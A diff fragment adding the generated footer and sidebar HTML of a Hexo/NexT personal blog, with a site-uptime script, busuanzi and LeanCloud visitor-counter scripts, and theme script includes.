class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#scmt"><span class="nav-number">2.2.1.</span> <span class="nav-text">scmt</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Trick"
+      src="/images/TRICK-LOGO.gif">
+  <p class="site-author-name" itemprop="name">Trick</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/YTrick" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;YTrick" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1319699069@qq.com" title="E-Mail → mailto:1319699069@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Trick</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">82k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:15</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+<!--添加运行时间-->
+<span id="sitetime"></span>
+<script language=javascript>
+	function siteTime(){
+		window.setTimeout("siteTime()", 1000);
+		var seconds = 1000;
+		var minutes = seconds * 60;
+		var hours = minutes * 60;
+		var days = hours * 24;
+		var years = days * 365;
+		var today = new Date();
+		var todayYear = today.getFullYear();
+		var todayMonth = today.getMonth()+1;
+		var todayDate = today.getDate();
+		var todayHour = today.getHours();
+		var todayMinute = today.getMinutes();
+		var todaySecond = today.getSeconds();
+		/* 
+      Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+      year - 作为date对象的年份，为4位年份值
+      month - 0-11之间的整数，做为date对象的月份
+      day - 1-31之间的整数，做为date对象的天数
+      hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+      minutes - 0-59之间的整数，做为date对象的分钟数
+      seconds - 0-59之间的整数，做为date对象的秒数
+      microseconds - 0-999之间的整数，做为date对象的毫秒数
+     */
+		var t1 = Date.UTC(2020,03,14,18,12,20); //北京时间2018-2-13 00:00:00
+		var t2 = Date.UTC(todayYear,todayMonth,todayDate,todayHour,todayMinute,todaySecond);
+		var diff = t2-t1;
+		var diffYears = Math.floor(diff/years);
+		var diffDays = Math.floor((diff/days)-diffYears*365);
+		var diffHours = Math.floor((diff-(diffYears*365+diffDays)*days)/hours);
+		var diffMinutes = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours)/minutes);
+		var diffSeconds = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours-diffMinutes*minutes)/seconds);
+		document.getElementById("sitetime").innerHTML=" 已运行"+/*diffYears+" 年 "+*/diffDays+" 天 "+diffHours+" 小时 "+diffMinutes+" 分钟 "+diffSeconds+" 秒";
+	}
+	siteTime();
+</script>
+<!--// 添加运行时间-->
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+<script>
+  (function() {
+    function leancloudSelector(url) {
+      url = encodeURI(url);
+      return document.getElementById(url).querySelector('.leancloud-visitors-count');
+    }
+
+    function addCount(Counter) {
+      var visitors = document.querySelector('.leancloud_visitors');
+      var url = decodeURI(visitors.id);
+      var title = visitors.dataset.flagTitle;
+
+      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url })))
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length > 0) {
+            var counter = results[0];
+            leancloudSelector(url).innerText = counter.time + 1;
+            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
+              .catch(error => {
+                console.error('Failed to save visitor count', error);
+              });
+          } else {
+              leancloudSelector(url).innerText = 'Counter not initialized! More info at console err msg.';
+              console.error('ATTENTION! LeanCloud counter has security bug, see how to solve it here: https://github.com/theme-next/hexo-leancloud-counter-security. \n However, you can still use LeanCloud without security, by setting `security` option to `false`.');
+            
+          }
+        })
+        .catch(error => {
+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+
+    function showTime(Counter) {
+      var visitors = document.querySelectorAll('.leancloud_visitors');
+      var entries = [...visitors].map(element => {
+        return decodeURI(element.id);
+      });
+
+      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url: { '$in': entries } })))
+        .then(response => response.json())
+        .then(({ results }) => {
+          for (let url of entries) {
+            let target = results.find(item => item.url === url);
+            leancloudSelector(url).innerText = target ? target.time : 0;
+          }
+        })
+        .catch(error => {
+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+
+    let { app_id, app_key, server_url } = {"enable":true,"app_id":"Jdqt1ahnKhMjhJF9kATVjUh3-gzGzoHsz","app_key":"L6hRhY9QJyH30SR69WxSP5Ei","server_url":null,"security":true};
+    function fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${api_server}/1.1${url}`, {
+          method,
+          headers: {
+            'X-LC-Id'     : app_id,
+            'X-LC-Key'    : app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      if (CONFIG.page.isPost) {
+        if (CONFIG.hostname !== location.hostname) return;
+        addCount(Counter);
+      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
+        showTime(Counter);
+      }
+    }
+
+    let api_server = app_id.slice(-9) !== '-MdYXbMMI' ? server_url : `https://${app_id.slice(0, 8).toLowerCase()}.api.lncldglobal.com`;
+
+    if (api_server) {
+      fetchData(api_server);
+    } else {
+      fetch('https://app-router.leancloud.cn/2/route?appId=' + app_id)
+        .then(response => response.json())
+        .then(({ api_server }) => {
+          fetchData('https://' + api_server);
+        });
+    }
+  })();
+</script>
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
